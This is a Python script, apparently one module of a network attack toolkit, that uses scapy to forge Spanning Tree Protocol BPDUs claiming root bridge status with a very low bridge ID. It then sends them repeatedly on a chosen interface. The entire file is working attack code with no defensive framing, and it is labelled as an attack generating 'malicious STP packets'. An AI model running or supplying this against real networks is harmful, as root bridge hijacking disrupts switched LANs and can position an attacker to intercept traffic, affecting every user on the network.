from scapy.all import Ether, Dot3, LLC, STP, sendp
import argparse
import time

def execute(args):
    """Execute STP attack"""
    print(f"[STP Attack] Starting on interface {args.interface}")
    
    try:
        packets = generate_stp_packets(args.count if args.count else 10)
        
        for i, packet in enumerate(packets):
            sendp(packet, iface=args.interface, verbose=args.verbose)
            print(f"[STP Attack] Sent STP packet {i+1}")
            time.sleep(1) 
        
        print("[STP Attack] Completed successfully")
        return True
        
    except Exception as e:
        print(f"[STP Attack] Error: {e}")
        return False

def generate_stp_packets(count=10):
    """Generate malicious STP packets"""
    packets = []
    
    for i in range(count):
        stp_packet = (
            Ether(dst="01:80:c2:00:00:00") / 
            Dot3() /
            LLC(dsap=0x42, ssap=0x42, ctrl=3) /
            STP(
                proto=0, 
                version=0, 
                bpdutype=0,
                flags=0, 
                rootid=0x1000,
                rootmac="00:00:00:00:00:01", 
                pathcost=0, 
                bridgeid=0x1000, 
                bridgemac="00:00:00:00:00:01", 
                portid=0x8001, 
                age=0, 
                maxage=20, 
                hellotime=2, 
                fwddelay=15
            )
        )
        
        packets.append(stp_packet)
    
    return packets

def add_arguments(parser):
    """Add STP attack-specific arguments to parser"""
    parser.add_argument("--count", "-c", type=int, default=10, 
                       help="Number of STP packets to send")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="STP Attack")
    parser.add_argument("--interface", "-i", required=True, help="Network interface")
    parser.add_argument("--count", "-c", type=int, default=10, 
                       help="Number of STP packets to send")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    execute(args)